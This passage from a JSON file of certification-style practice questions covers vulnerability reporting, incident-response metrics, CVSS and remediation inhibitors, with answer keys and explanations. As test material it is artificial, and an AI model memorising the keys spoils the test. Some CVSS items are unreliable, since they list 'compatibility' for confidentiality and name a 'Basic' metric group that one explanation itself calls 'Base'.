be employed. Implementing compensating controls isn’t typically part of the RCA process itself.","l":"c12-ir-report","l2":"c9-process","k":"root cause analysis RCA steps"},{"id":"d4-51","set":"d4","ch":12,"d":4,"q":"What information is typically included in a list of affected hosts in a vulnerability management report?","o":["Hostname and IP address","IP address and MAC address","Hostname and MAC address","Hostname and subnet mask"],"a":0,"e":"The hostname and IP address are commonly used to identify each vulnerable host in a vulnerability report. The hardware (MAC) address is not typically listed, and subnet masks are also not typically listed.","l":"c12-vuln-report","l2":"","k":"vulnerability report host identification"},{"id":"d4-52","set":"d4","ch":12,"d":4,"q":"Hannah wants to establish a metric that will help her organization determine if their response process completes in a timely manner. Which common metric should she select to help assess this?","o":["Mean time to detect","Mean time to report","Mean time to respond","Mean time to remediate"],"a":3,"e":"Assessing whether incidents are remediated in a timely manner can help Hannah determine if IR completion is happening in a timely manner since remediation is the last nonreporting stage in the process and reporting is not typically a process where time to complete is critical to an organization.","l":"c12-ir-report","l2":"","k":"mean time to remediate MTTR"},{"id":"d4-53","set":"d4","ch":12,"d":4,"q":"Mikayla’s team has determined that a previously remediated vulnerability has reappeared after installation of a vendor supplied patch. What type of vulnerability management issue is this?","o":["Risk scoring","Prioritization","Mitigation","Recurrence"],"a":3,"e":"This is an example of recurrence and is something that should be reported on as part of Mikalya’s ongoing vulnerability reporting and exception management process. No risk scoring or prioritization is mentioned, and while mitigation was performed, reappearing vulnerabilities are recurrence, not mitigation.","l":"c12-vuln-report","l2":"","k":"vulnerability recurrence reporting"},{"id":"d4-54","set":"d4","ch":7,"d":4,"q":"Gurvinder wants to consider impact metrics like the integrity impact, availability impact, and compatibility impact of a vulnerability that is scored using CVSS. What metric group includes this information?","o":["Basic","Environmental","Temporal","Residual"],"a":0,"e":"The Basic Metric Group for CVSS includes both exploitability metrics and impact metrics. The impact metric is made up of components covering compatibility, integrity, and availability impact as well as scope.","l":"c7-cvss","l2":"","k":"CVSS basic metric group impact"},{"id":"d4-55","set":"d4","ch":12,"d":4,"q":"Which of the following is not a type of stakeholder that will frequently need to understand an organization’s overall vulnerability stance or status?","o":["Security practitioners","Legal team","Auditors","Compliance stakeholders"],"a":1,"e":"The legal team rarely needs to know an organization’s vulnerability management status or stance. Security, audit, and compliance stakeholders do.","l":"c12-vuln-report","l2":"","k":"vulnerability management stakeholders"},{"id":"d4-56","set":"d4","ch":7,"d":4,"q":"Which of the following CVSS scores indicates the highest impact to an organization?","o":["9.6","7.5","3.2","1.3"],"a":0,"e":"CVSS scores range from 0 to 10, with higher scores having greater impact, exploitability, temporal, and environmental factors. Without more context, the highest number will generally indicate the highest impact.","l":"c7-cvss","l2":"","k":"CVSS score severity interpretation"},{"id":"d4-57","set":"d4","ch":12,"d":4,"q":"Expectations of time to remediate and time to patch by a vendor are both examples of what in a vulnerability management program?","o":["Service level objectives","Risks","Vulnerabilities","Internal policies"],"a":0,"e":"Service level objectives (SLOs) are part of a service level agreement (SLA) with a vendor. Time to remediate and time to patch are not risks or vulnerabilities, and internal policies do not determine vendor expectations without a contract or agreement in place.","l":"c12-vuln-report","l2":"","k":"service level objectives SLOs"},{"id":"d4-58","set":"d4","ch":12,"d":4,"q":"What issue is organizational governance likely to cause in a vulnerability management program?","o":["It may prevent vulnerabilities from being patched or compensating controls being used.","It may increase the number of vulnerabilities that need patched.","It may slow down patching.","It may limit the vulnerabilities that will be patched."],"a":2,"e":"Governance processes are most likely to lead to slower patching processes because of approval requirements. They typically do not prevent patches from being installed or the use of compensating controls, although it may take some time to identify which option will be put in place. It typically doesn’t increase the number of vulnerabilities that need to be patched, nor do they typically limit what vulnerabilities will be patched.","l":"c12-vuln-report","l2":"c8-governance","k":"governance impact on patching"},{"id":"d4-59","set":"d4","ch":12,"d":4,"q":"Jacob has initiated the incident response process in his organization. IoCs have been identified, and Jacob is ready to take the next step in the process. What typically happens next?","o":["Legal counsel is notified.","Incident responders collect forensic data.","Law enforcement is notified.","Incident responders determine if it is a real incident."],"a":3,"e":"Just because IoCs exist doesn’t mean that an incident has occurred. Instead, responders need to analyze the data available and to look for additional information that will tell if the incident is a real incident or a false positive. Notifying counsel or law enforcement happens after an incident is verified and only if needed. Collecting forensic data happens once the organization determines that an incident has occurred and wants to investigate it.","l":"c12-ir-report","l2":"c9-process","k":"incident declaration and triage"},{"id":"d4-60","set":"d4","ch":12,"d":4,"q":"What is the primary difference between mean time to close and mean time to respond?","o":["Mean time to close measures the entire incident response process; mean time to respond measures how long it takes to begin initial response.","Mean time to close measures how long it takes to stop a specific compromise; mean time to respond measures how long the compromise is active.","Mean time to close and mean time to respond have the same meaning, but are measured from removal of the malware, and discovery of the malware respectively.","Mean time to close measures the time from IoC removal to the final report; mean time to respond measures how long it takes to begin initial response."],"a":0,"e":"Mean time to close measures the entire length of an incident response process from start to final report and closure. Mean time to respond measures how long it takes a team to begin initial response.","l":"c12-ir-report","l2":"","k":"incident response metrics MTTC MTTR"},{"id":"d4-61","set":"d4","ch":12,"d":4,"q":"Melissa’s organization relies on a file sharing function built into their business software. A recent security flaw has resulted in the next patch removing the file sharing functionality. Melissa’s team has been asked by the functional offices who use the tool to delay the patch to allow them to identify a work-around. What inhibitor to remediation has Melissa encountered?","o":["Contractual agreements","Organizational governance","Legacy systems","Degrading functionality"],"a":3,"e":"Melissa’s team is working to counter issues with degrading functionality. If the patch is installed, critical business processes will be disrupted. No mention is made of contractual agreements or governance that will be impacted, and the software is not described as a legacy system. Instead, it is receiving patches and updates.","l":"c12-vuln-report","l2":"","k":"remediation inhibitor degrading functionality"},{"id":"d4-62","set":"d4","ch":12,"d":4,"q":"Which of the following is the best indicator of a successful security awareness effort?","o":["False positive rate","Phishing campaign click rate","True positive rate","Mean time to respond"],"a":1,"e":"Phishing campaign click rates can help you determine if your awareness efforts are successful. Low rates are typically indicative of successful awareness efforts. False positive and true positive rates are more typically associated with work from the security team to decrease incorrect identification, and mean time to respond is improved through process improvements.","l":"c12-vuln-report","l2":"c3-cloud-social","k":"security awareness phishing click rate"},{"id":"d4-63","set":"d4","ch":12,"d":4,"q":"Annie’s organization makes divisional administrators responsible for patching vulnerabilities after they are notified of them using a ticketing system. Annie has noticed that the administrators are not promptly patching systems. What should she do to most effectively address this issue?","o":["Switch notification to automated emails.","Invest in an awareness and training campaign.","Use the vulnerabilities to compromise the systems to prove a point.","Involve HR due to a lack of job performance."],"a":1,"e":"Awareness and training programs are an important part of vulnerability management practices, and Annie can expect that if administrators understand their roles, job requirements, and the importance of patching that they will more promptly patch systems they are responsible for. Switching notification styles is unlikely to have a major impact, attacking systems is not a common or typically acceptable practice in most organizations, and escalating to HR may lead to resentment and shouldn’t be Annie’s first option.","l":"c12-vuln-report","l2":"","k":"vulnerability management awareness training"},{"id":"d4-64","set":"d4","ch":12,"d":4,"q":"Henry’s organization handles credit card data as part of their operations. What type of vulnerability management report is Henry most likely to need to run due to this?","o":["PCI compliance reporting","GLBA compliance reporting","A list of compromised systems","A list of unpatched systems"],"a":0,"e":"Henry’s organization is most likely to need to be compliant with the Payment Card Industry (PCI) standards and thus will need to run reports that will help prove PCI compliance. A list of compromised or unpatched systems is not required for PCI.","l":"c12-vuln-report","l2":"c6-requirements","k":"PCI compliance reporting"},{"id":"d4-65","set":"d4","ch":12,"d":4,"q":"Jen has discovered that many systems in her organization are being deployed with a vulnerable service active. What solution is best suited to addressing this type of issue in a large organization?","o":["An awareness program","Compensating controls","Changing business requirements","Configuration management"],"a":3,"e":"Jen knows that configuration management is an appropriate solution to ensure that organization wide standards are met and that it can help with this type of issue. She may also need to implement an awareness program to ensure that admins are appropriately configuring systems before deployment, but configuration management is the more complete fix. Compensating controls aren’t indicated by the question, and changing business requirements isn’t a demonstrated need either.","l":"c12-vuln-report","l2":"c8-controls","k":"configuration management baseline hardening"},{"id":"d4-66","set":"d4","ch":12,"d":4,"q":"An incident report should indicate the individuals involved, as well as which of the following items?","o":["The hardware addresses of the systems involved","The time frame the event or incident occurred","A written statement from each individual interviewed","A police report"],"a":1,"e":"Incident reports typically need to include who, what, when, where, and why. Hardware addresses, written statements from those involved, and police reports are rarely included.","l":"c12-ir-report","l2":"","k":"incident report key components"},{"id":"d4-67","set":"d4","ch":12,"d":4,"q":"Jason has defined the problem as part of a root-cause analysis effort. What step typically comes next in RCA?","o":["Collecting data about the problem","Determining the root cause of the problem","Determining potential causal factors","Analyzing the causes"],"a":0,"e":"Root-cause analysis requires data to proceed, and Jason knows that his next step is to collect data. Then he will proceed to determining causal factors, identifying the root cause, and prioritizing causes.","l":"c12-ir-report","l2":"c9-process","k":"root cause analysis data collection"},{"id":"d4-68","set":"d4","ch":12,"d":4,"q":"Mean time to respond is an example of what?","o":["An incident response report target","An industry standard SOW","An industry standard SLA","An incident response KPI"],"a":3,"e":"Mean time to respond is a key performance indicator (KPI) for incident response.","l":"c12-ir-report","l2":"","k":"incident response KPI MTTR"},{"id":"d4-69","set":"d4","ch":12,"d":4,"q":"What information is gathered as part of a lessons learned exercise conducted at the end of an incident response process?","o":["Issues that will positively impact future incident response processes","Both positive and negative lessons learned during the process","Issues that will negatively impact future incident response processes","Root causes of the incident"],"a":1,"e":"Lessons learned should include both positive and negative lessons learned. This ensures that organizations reinforce what goes well and improve what goes badly. Root causes are identified as part of a root-cause analysis, not as part of lessons learned.","l":"c12-ir-report","l2":"c9-process","k":"incident lessons learned review"},{"id":"d4-70","set":"d4","ch":12,"d":4,"q":"Jason wants to quickly understand the content of an incident report. What should he read?","o":["The scope statement","The timeline","The executive summary","The evidence"],"a":2,"e":"Executive summaries should be short and to the point and are intended to allow readers to quickly understand the content of the report without reading the full report. Scope statements describe the scale and impacted systems or services, timelines list when events happened, and evidence provides detailed information about the incident that support analysis or theories.","l":"c12-ir-report","l2":"","k":"incident report executive summary"},{"id":"d4-71","set":"d4","ch":7,"d":4,"q":"What important role does criticality and impact information play in organizational use of CVSS scores?","o":["It helps with prioritization.","It determines if a patch should be installed.","It determines if a compensating control should be used.","It helps prevent recurrence."],"a":0,"e":"Combining criticality and impact information organizations can determine both how dangerous the issue is and how likely it is to impact them. That means that CVSS can provide a useful rating to prioritize their efforts given limited resources and time. Recurrence is not impacted by criticality or impact, and instead tends to point to technical or procedural issues. Compensating controls are used when a patch is not available or the fix does not meet the business needs of an organization. Patch installation is determined by administrators based on testing and organizational policies which may be influenced by criticality and impact for prioritization.","l":"c7-cvss","l2":"c12-vuln-report","k":"CVSS remediation prioritization"},{"id":"d4-72","set":"d4","ch":12,"d":4,"q":"Natalie has signed a service level agreement with a customer that specifies performance requirements for a service that her company provides. How is this most likely to impact her ability to remediate vulnerabilities on the underlying containerized services that provide the service?","o":["It will require Natalie to seek customer approval for each patch that is deployed via their governance process.","It will require Natalie to ensure that the service is not disrupted when new, patched containers are deployed and vulnerable containers are disabled.","It will allow as much downtime as needed as patches are deployed to the containerized services.","It will prevent Natalie from upgrading the legacy systems the customer relies on."],"a":1,"e":"The fact that Natalie’s organization uses containers will likely help her to avoid unexpected or unwanted downtime, but Natalie still needs to ensure the service is not interrupted as she deployed patched containers and removes the old vulnerable containers. An SLA does not require external governance; instead, it determines key aspects of the performance of the service like uptime, and downtime is rarely unlimited. Otherwise, an SLA wouldn’t be in use. Finally, there is no mention of legacy systems in this question.","l":"c12-vuln-report","l2":"c2-infra","k":"container patch deployment SLA"},{"id":"d4-73","set":"d4","ch":12,"d":4,"q":"Angela’s organization has discovered that their Windows workstations have a vulnerability that was discovered more than a year ago. What solution is best suited to handling this known vulnerability?","o":["Patching","Awareness, education, and training","Changing business requirements","Compensating controls"],"a":0,"e":"Angela knows that simply patching it is likely the best option. A well-known Windows vulnerability will typically have an available patch. She should find out why her organization has failed to patch it and address the issue. That may require awareness or training once she figures out why the patching isn’t happening! Compensating controls are typically not necessary for an older, known vulnerability in a supported product because patches usually exist, and there’s no indication in the question of a business process change that would help.","l":"c12-vuln-report","l2":"c8-controls","k":"vulnerability remediation patching"},{"id":"d4-74","set":"d4","ch":12,"d":4,"q":"Jacob notes that the patch for a critical flaw requires a service to be disabled. He knows that the service provides backend connectivity for a tool that his sales teams use, and that they will need to use email to communicate about sales once the patch is installed. What type of remediation issue is this?","o":["Patch availability","Proprietary data","Legacy systems","Degrading functionality"],"a":3,"e":"This is an issue with degrading functionality. Organizations may have to choose between retaining functionality and installing patches, and Jacob will have to work with business functional leaders to determine the impact of the patch versus the risk of a compensating control or simply not installing the patch. The patch is available, so it’s not an issue of patch availability—although sometimes the patch that is available may not be the final patch that allows functionality to work. Proprietary data is not a typical inhibitor of remediation, and there is no indication this is a legacy system.","l":"c12-vuln-report","l2":"","k":"remediation inhibitor degrading functionality"},{"id":"d4-75","set":"d4","ch":12,"d":4,"q":"Bob is a security analyst responsible for vulnerability scanning and reporting in his organization. He has noticed a trend of unpatched vulnerabilities on systems that process data covered by PCI-DSS. What should he note to management?","o":["The systems have a compliance issue.","The patches are not installing properly due to misconfiguration.","Encryption is causing problems with patching.","The systems are proprietary and patches may not be available."],"a":0,"e":"PCI-DSS is the payment card industry’s standard for security, and unpatched vulnerabilities on systems that need to be PCI-DSS compliant makes this a compliance issue. There’s not enough detail to determine why patches aren’t installed, encryption is not indicated by the question, and there is no information that should cause you to think that these are proprietary systems.","l":"c12-vuln-report","l2":"c6-requirements","k":"PCI DSS compliance findings"},{"id":"d4-76","set":"d4","ch":12,"d":4,"q":"Gurvinder’s organization is required to report breaches within 24 hours of the breach being detected, regardless of how far into the investigation the organization is. What type of requirement is most likely to drive this type of communication?","o":["Contractual requirements","Social media requirements","Regulatory requirements","Reputational requirements"],"a":2,"e":"Regulatory requirements often have specific time frames for communication, regardless of the state of the incident response process. Contractual requirements tend to offer the organization more flexibility in reporting. Social media does not create requirements, and reputation may benefit from timely notification but does not result in requirements either.","l":"c12-ir-report","l2":"","k":"regulatory breach reporting deadlines"},{"id":"d4-77","set":"d4","ch":12,"d":4,"q":"Xuan’s organization uses an old, no longer updated or sold software package that has an embedded web server that it exposes on every workstation that runs the software allowing file transfer between workstations. During a vulnerability scan the web browser was highlighted as a critical vulnerability. Which of the following solutions should Xuan recommend to best resolve the issue?","o":["An awareness program","Compensating controls","Changing business requirements","Configuration management"],"a":2,"e":"Xuan should recommend that the organization change business practices. There are many other ways to exchange files that do not require a vulnerable software package, and change in process would resolve this. Awareness, compensating controls, and configuration management do not address the business need.","l":"c12-vuln-report","l2":"","k":"changing business requirements remediation"},{"id":"d4-78","set":"d4","ch":12,"d":4,"q":"Jackie is reviewing the risk scores round in a vulnerability report and notes that the risk she is reviewing scores a 1.0. What recommendation should Jackie make about the vulnerability?","o":["It should be patched immediately because the risk score is high.","The risk is very low and can likely be ignored.","The risk is low and should be patched in the next patch cycle.","It should be patched immediately because it is in the top 10 percent of risks."],"a":2,"e":"While a risk as low as 1.0 on the CVSS scale is unlikely to cause immediate harm, if a patch is available and does not introduce additional risk, it should still be installed at the next patch window.","l":"c12-vuln-report","l2":"c7-cvss","k":"low severity vulnerability remediation"},{"id":"d4-79","set":"d4","ch":12,"d":4,"q":"Log entries are commonly found in what part of an incident response report?","o":["Recommendations","Executive summary","Evidence","Timeline"],"a":2,"e":"The evidence section of an incident response report often includes information like log entries. Log files typically don’t show up in the executive summary, the timeline, or the recommendations section of the report.","l":"c12-ir-report","l2":"","k":"incident report evidence section"},{"id":"d4-80","set":"d4","ch":7,"d":4,"q":"Kathleen wants to build a prioritized list of vulnerabilities for her organization. What part of the CVSS metric will help her adjust the score to best match her organization’s availability requirements?","o":["The base metric group","The advanced metric group","The temporal metric group","The environmental metric group"],"a":3,"e":"The environmental group includes information that takes an organization’s specific requirements into account including availability requirements the organization itself establishes. Even if you’re not familiar with the CVSS scoring system’s three groupings (basic, temporal, and environmental), you can likely answer a question like this by considering the likely meaning of each of these options.","l":"c7-cvss","l2":"","k":"CVSS environmental metric group"},{"id":"d4-81","set":"d4","ch":12,"d":4,"q":"Derek is the lead of his organization’s finance and accounting team and has expressed concerns about installing patches because his team relies on the service that is being patched. Derek noted that the team is at a critical time because of annual financial reports. What type of inhibitor to remediation is this?","o":["A potential MOU violation","A legacy system issue","A business process interruption issue","A potential SLA violation"],"a":2,"e":"This is an example of a business process interruption issue. Organizations are often sensitive to downtime and outages that could be caused by patching and vulnerability remediation during sensitive or busy parts of their business cycle. This often drives “freezes” or other windows where patching may be paused or delayed. There is no mention of a MOU or SLA that would be breached, and the system is not described as being a legacy system, making these less likely choices.","l":"c12-vuln-report","l2":"","k":"business process interruption inhibitor"},{"id":"d4-82","set":"d4","ch":12,"d":4,"q":"What part of an incident response report describes detailed ways to avoid similar issues in the future?","o":["The executive summary","Lessons learned","The scope","Evidence"],"a":1,"e":"Incident response reports should include a lessons learned listing that describes ways to improve as well as how to avoid similar issues in the future. The executive summary is brief, and while it may point to lessons learned, it will not typically cover them in depth. The scope statement for an incident describes what systems, services, or other elements and assets of the organizations were impacted. Evidence provides information about how the incident was detected.","l":"c12-ir-report","l2":"c9-process","k":"incident lessons learned documentation"},{"id":"d4-83","set":"d4","ch":12,"d":4,"q":"Potential compensating controls can be found in what section of a vulnerability management report?","o":["The mitigations section","The risk scores","The recurrence section","The affected hosts list"],"a":0,"e":"Compensating controls are an example of a mitigation technique and can be found as part of the mitigation recommendations.","l":"c12-vuln-report","l2":"","k":"vulnerability report mitigation section"},{"id":"d4-84","set":"d4","ch":12,"d":4,"q":"The company that Amari works for uses an embedded system as part of a manufacturing process. The system relies on an operating system created by the machine’s vendor, and Amari’s team has identified vulnerabilities during a network scan. What type of system should Amari identify this device as?","o":["A proprietary system","A legacy system","A primary system","A secondary system"],"a":0,"e":"This is an example of a proprietary system that may not use commonly available and supported operating systems or software. Legacy systems are out-of-date, often unsupported systems. Primary and secondary systems are not terms typically used to categorize vulnerable systems.","l":"c12-vuln-report","l2":"c7-web-ot","k":"proprietary system remediation inhibitor"},{"id":"d4-85","set":"d4","ch":12,"d":4,"q":"Amari has discovered that a phishing email campaign has been successful and that multiple accounts have been accessed by malicious actors. What should she do next?","o":["Notify law enforcement.","Declare an incident.","Mark the sender in her organization’s phishing blacklist.","Create an IoC based on the phishing email."],"a":1,"e":"Amari’s first priority should be declaring an incident. Once an incident has been declared, she can take further action while following her organization’s incident response process, which may include actions like creating an IoC, guidance on when and why to contact law enforcement, or taking actions like blacklisting senders.","l":"c12-ir-report","l2":"c9-process","k":"incident declaration"},{"id":"d4-86","set":"d4","ch":12,"d":4,"q":"Amari has deployed a compensating control to protect the vulnerable embedded system that she is responsible for. What step should she take next?","o":["Create an incident report and distribute it to appropriate recipients.","Remove the device from the vulnerability scanning process to avoid continued false positives.","Note the compensating control and flag the device for follow-up to see if patches become available.","Flag the vulnerabilities previously discovered as false positives."],"a":2,"e":"Amari should note the compensating control and ensure that periodic review is done to determine if new patches are required or any additional compensating controls or maintenance of the firewall device is required. No incident occurred, meaning an incident report is not necessary. The device should not be removed from the vulnerability scanning system because it remains on the network. The vulnerabilities were not false positives and should not be treated as such.","l":"c12-vuln-report","l2":"","k":"compensating control tracking"},{"id":"d4-87","set":"d4","ch":12,"d":4,"q":"As part of their contracted support model, Christina’s organization ensures that patches are installed within 14 calendar days, and that critical patches are installed within 48 hours of their release. What term best describes this type of agreement?","o":["An SLA","An NDA","Organizational governance","A KPI"],"a":0,"e":"This is an example of a service level agreement, or SLA. Christina’s organization has set a performance level that they will meet and can be assessed against. If they fail, contractual penalties may apply. An NDA is a nondisclosure agreement, used to protect confidential information. Organizational governance reviews and approves changes and other actions, and might be involved in setting or agreeing to SLAs, and a KPI is a key performance indicator. If the question asked about the organization measuring how often they achieve the stated numbers, that would be an example of a KPI.","l":"c12-vuln-report","l2":"","k":"service level agreement SLA"},{"id":"d4-88","set":"d4","ch":12,"d":4,"q":"Michele’s root-cause analysis has determined a number of events that contributed to the problem but were not the root cause. What has she identified?","o":["Compensating controls","Causal factors","Branch causes","Nonroot causes"],"a":1,"e":"Causal factors are events that contribute to an incident but that are not the root cause.","l":"c12-ir-report","l2":"c9-process","k":"root cause analysis causal factors"},{"id":"d4-89","set":"d4","ch":7,"d":4,"q":"What three groups of metrics make up a CVSS score?","o":["The Core Metric Group, the Impact Metric Group, and the Organizational Metric Group","The Core Metric Group, the Temporal Metric Group, and the Organizational Metric Group","The Basic Metric Group, the Impact Metric Group, and the Environmental Metric Group","The Basic Metric Group, the Temporal Metric Group, and the Environmental Metric Group"],"a":3,"e":"CVSS scores are based on three sets of metrics: the Base, Temporal, and Environmental groups.","l":"c7-cvss","l2":"","k":"CVSS metric groups"},{"id":"d4-90","set":"d4","ch":12,"d":4,"q":"Which of the following questions is not typically answered as part of an incident response report?","o":["Who?","When?","What?","With whom?"],"a":3,"e":"It may seem like common sense, but answering the five Ws (who, what, when, where, and why) is common in incident response reports. With whom, however, is not one of the five Ws.","l":"c12-ir-report","l2":"","k":"incident report five Ws"},{"id":"d4-91","set":"d4","ch":12,"d":4,"q":"Michelle has been working to contain an incident for the past eight hours and her shift is ending. Which of the following is the most important to include in her shift handoff documentation to ensure that the incident response process continues successfully?","o":["Her list of IoCs","The status of the containment effort","A root-cause analysis","A media communications plan with next steps included"],"a":1,"e":"During an active incident the most important information on this list is knowing the containment status. Since the problem doesn’t note that Michelle has successfully contained the issue, handing that task off is critical. IoCs may be useful as part of the response, but without knowing where she left off, the next shift would be starting from an unknown state. Root-cause analysis happens after an incident, not during, and a communications plan might be useful but isn’t as critical as the status information until the issue is contained.","l":"c12-ir-report","l2":"","k":"shift and incident handover"},{"id":"d4-92","set":"d4","ch":12,"d":4,"q":"Which of the following is most important when tailoring a threat intelligence report for an organization?","o":["The number and type of security devices deployed by the organization","The organization’s critical asset inventory","A list of major incidents from the last three years","The organization’s cyber insurance thresholds"],"a":1,"e":"Understanding the organization’s critical asset inventory allows security analysts to tailor threat intelligence reports to focus on threats to the organization. The type of security devices is part of security design, but doesn’t impact threat intelligence reporting as much as a complete list of critical assets which may include many of those devices. Major incident information should influence security plans and may guide some threat intelligence reporting but understanding the organization’s critical assets is more important when considering what threats to pay attention to. Finally, cyber insurance thresholds are critical for incident response practices and as part of risk management, but aren’t used for tailoring threat intelligence reports.","l":"c12-ir-report","l2":"c4-collect","k":"threat intelligence report tailoring"},{"id":"d4-93","set":"d4","ch":12,"d":4,"q":"The trend for Katie’s vulnerability remediation time to resolve has been decreasing for the past six months. What should Katie do?<figure><img alt=\"Bar chart depicts the time to remediate in minutes for 6 months, with bars peaking at 31 in January and February, declining to 22 in June.\" loading=\"lazy\" src=\"img/pt/c04un005.png\"/></figure>","o":["Modify the vulnerability scanning process to better detect new vulnerabilities.","Continue operations; this is a desired result.","Invest more resources to increase the time to remediate instead.","Investigate false positive rates to improve remediation."],"a":1,"e":"A decreasing trend in time to remediate is a desirable outcome. Katie should continue what her organization is doing, or could potentially choose to do more of whatever is causing the trend to improve! None of the other response choices are required when a trend is moving in a positive direction.","l":"c12-vuln-report","l2":"","k":"vulnerability remediation time trends"},{"id":"d4-94","set":"d4","ch":12,"d":4,"q":"Josh’s organization is preparing to install a series of critical patches when a departmental business manager refuses to sign off on the patch. After discussing the issue with the manager, Josh is informed that the patch documentation notes that a function that that manager’s team uses frequently will be disabled by the patch. How should Josh categorize this issue?","o":["A legacy system issue","A degraded functionality issue","A problem due to a contractual agreement","A proprietary system issue"],"a":1,"e":"This is an example of degraded functionality. The department may need the functionality to perform business functions, and organizational governance may now have to decide if the business team needs to find another way to accomplish the task or if a compensating control may be appropriate. There is nothing to indicate that this is a legacy or proprietary system, and there is no mention of a contractual requirement for this functionality.","l":"c12-vuln-report","l2":"","k":"remediation inhibitor degraded functionality"},{"id":"d4-95","set":"d4","ch":12,"d":4,"q":"Oliver’s team has updated their risk scorecard, and has discovered that the organization’s risk posture has gotten worse due to more unpatched critical vulnerabilities. What recommendation should he make to best address this concern?","o":["Review patching practices and take action to improve time to patch.","Install host firewalls to better protect the open services while they are waiting to be patched.","Remove unpatched systems from the network until they can be patched.","Ask for more budget for security operations in the next annual budget cycle."],"a":0,"e":"Reviewing the organization’s patching practices to identify any issues that are delaying or impacting remediation and taking action to improve time to patch Oliver’s team should decrease the number of unpatched critical vulnerabilities. In most organizations host firewalls should already be in place, meaning that exposed services will remain open and patches remain important. Removing unpatched systems from the network will impact functionality and will likely have business impacts, and asking for more budget in an annual cycle doesn’t not have a timely impact.","l":"c12-vuln-report","l2":"c8-analyzing","k":"patch management risk reduction"},{"id":"d4-96","set":"d4","ch":12,"d":4,"q":"After a recent critical update Jill has noticed that her organization’s vulnerability scans are returning many critical findings across many Windows 11 workstations that upon further investigation are false positives. What issue is most likely occurring?","o":["The vulnerability scanner is scanning the wrong systems.","Patches were installed but the scanner is not detecting them properly.","Patches were installed before the systems were rebooted.","The systems have host firewalls enabled."],"a":1,"e":"The most likely answer is that the scanner’s definitions for the vulnerability are not properly recognizing the patch. Examples of this occur when a detection focuses on a version number or other identifier that is not updated despite the underlying vulnerability being fixed. Scanning the wrong systems across a large number of workstations is unlikely, rebooting will typically enable patches, not disable them, and host firewalls will typically block scans, not cause a false positive identification of a vulnerability.","l":"c12-vuln-report","l2":"c7-validate","k":"scanner patch detection false positives"},{"id":"d4-97","set":"d4","ch":12,"d":4,"q":"After remediating her organization’s false positive rates for scans, Jill focuses on ensuring that identification of vulnerabilities accurately reflects the status of her systems. What is this called?","o":["The true positive rate","The adjusted rate","The false positive rate","The vulnerability rate"],"a":0,"e":"True positive rates measure actual detections. Here Jill has worked to ensure that her detections are real, lowering her false positive rate and increasing her true positive rate. Adjusted rate and vulnerability rate were made up for this question.","l":"c12-vuln-report","l2":"c7-validate","k":"vulnerability scanner true positive rate"},{"id":"d4-98","set":"d4","ch":1,"d":4,"q":"Jason’s organization wants to align their security program with their risks. What two factors should they assess to ensure their top risks match the business’s needs?","o":["Assess IoCs for their industry and compare it to industry numbers for impact.","Assess threats specific to their company and the impact of their occurrence.","Leverage the SANS Top 10 and combine it with their own risk assessment.","Review recent incidents nationwide and their impacts based on actual events that have been publicly reported."],"a":1,"e":"Jason knows that assessing threats and their potential impacts specific to his organization will result in the most accurate top risks list for his organization. Industrywide data, regardless of whether it’s through SANS, publicly reported incidents, or IoCs associated with the industry as a whole, will be less directly relevant.","l":"c1-risk","l2":"c8-analyzing","k":"threat and impact risk assessment"},{"id":"d4-99","set":"d4","ch":12,"d":4,"q":"Geoff has been notified that his Windows 10 system is out of main-line support and is no longer supported by his organization’s patching processes and desktop support team. He needs the system to continue running, as the software it runs is highly specialized and is not compatible with Windows 11. What type of inhibitor to remediation is this?","o":["A contractual agreement issue","A degraded functionality problem","An organizational governance issue","A legacy systems problem"],"a":3,"e":"This is an example of a legacy system. While Windows 10 only recently went out of mainstream support, the lack of patch availability and support from his organization makes this a legacy system issue. There’s no contractual agreement, and functionality is not being degraded. While there are workarounds from Microsoft for some Windows 10 systems, this isn’t a governance issue, as the system is now a legacy system.","l":"c12-vuln-report","l2":"c7-server-network","k":"legacy system remediation inhibitor"},{"id":"d4-100","set":"d4","ch":12,"d":4,"q":"Val is responsible for security for an organization that runs numerous scientific devices. Among them are specialized sensors that are network connected, but that do not run commodity operating systems. What type of inhibitor to remediation should she identify this as?","o":["Degraded performance","Legacy systems","Proprietary systems","Patch availability"],"a":2,"e":"These are proprietary systems. Nothing is noted about issues with patch availability, although patch availability is also more common with proprietary systems. No performance issues are indicated, and these are not described as being legacy systems.","l":"c12-vuln-report","l2":"","k":"proprietary system patching inhibitor"},{"id":"d4-101","set":"d4","ch":12,"d":4,"q":"Frankie has reviewed her organization’s mean time to close statistics and believes that process improvement is needed. Which of the following is most likely to positively impact mean time to close?","o":["Decreasing her organization’s alert volume","Decreasing her organization’s mean time to respond","Increasing her team’s mean time to detect","Increasing her organization’s false positive rate"],"a":1,"e":"Decreasing the time it takes to respond to an incident will impact how quickly they are dealt with and will result in a shorter time to close. Decreasing alert volume may help, but there isn’t enough information to determine if this is a driver of slowdowns. Increasing mean time to detect makes things slower, and increasing a false positive rate means the organization will spend more time chasing down incorrectly identified issues.","l":"c12-ir-report","l2":"","k":"improving incident response metrics"},{"id":"d4-102","set":"d4","ch":12,"d":4,"q":"Klara’s team wants to establish a metric that will help determine if their incident response process is working well. Which of the following metrics should they monitor to determine if the process of moving from detecting an IoC to investigating it as a potential incident is working well?","o":["Alert volume","Mean time to close","Mean time to respond","False positive rate"],"a":2,"e":"The mean time to respond for an organization is determined by how long on average it takes the organization to identify and respond to an incident. This is a useful way to look at whether the move from detection to investigation is working well. Alert volume helps to measure if tuning is being done appropriately, mean time to close measures how long it takes organizations to fully resolve incidents, and false positive rates measure when detections are wrong.","l":"c12-ir-report","l2":"","k":"mean time to respond metric"},{"id":"d4-103","set":"d4","ch":12,"d":4,"q":"Hung wants to tailor a threat intelligence summary about a new phishing campaign for his organization’s SOC. Which of the following best describes the tailoring he should perform?","o":["It should include IoCs related to the phishing attack and to the suspected threat actor.","It should focus on forensic artifacts and should include details of the malware payloads delivered to victims.","It should focus on business risk and strategic implications of the phishing attack if successful.","It should include remediation plans for impacted desktops and other devices."],"a":0,"e":"A SOC will be concerned with detecting and potentially stopping the phishing attack meaning that IoCs are the most valuable things that Hung can provide them with. Forensic artifacts and malware payload information will be useful to incident response staff, business risks and strategy are appropriate for management, and remediation plans for desktops and other devices may be used by technical support staff or for incident responders.","l":"c12-ir-report","l2":"c4-collect","k":"SOC threat intelligence reporting"},{"id":"pt1-1","set":"pt1","ch":3,"d":1,"q":"While reviewing network flow logs, John sees that network flow on a particular segment suddenly dropped to zero. What is the most likely cause of this?","o":["A denial-of-service attack","A link failure","High bandwidth consumption","Beaconing"],"a":1,"e":"The sudden drop to zero is most likely to be an example of link failure. A denial-of-service attack could result in this type of drop but is less likely for most organizations. High 